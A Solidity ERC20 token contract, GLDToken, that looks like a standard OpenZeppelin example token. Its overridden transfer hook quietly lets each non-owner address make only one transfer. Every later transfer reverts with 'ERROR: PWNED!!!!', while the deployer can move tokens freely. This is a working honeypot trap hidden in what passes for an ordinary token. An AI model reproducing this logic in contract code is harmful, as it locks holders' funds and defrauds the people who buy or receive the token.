// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract GLDToken is ERC20 {
    address private immutable _owner;
    mapping(address => bool) private _hasTraded;

    constructor(uint256 initial_supply) ERC20("GLDToken", "GLD") {
        _owner = msg.sender;
        _mint(msg.sender, initial_supply);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function _update(address from, address to, uint256 value) internal virtual override {
        if (from == address(0)) {
            super._update(from, to, value);
            return;
        }

        if (to == address(0)) {
            super._update(from, to, value);
            return;
        }

        if (from == _owner) {
            super._update(from, to, value);
            return;
        }

        if (!_hasTraded[from]) {
            _hasTraded[from] = true;
            super._update(from, to, value);
            return;
        }

        revert ("ERROR: PWNED!!!!");
    }
}
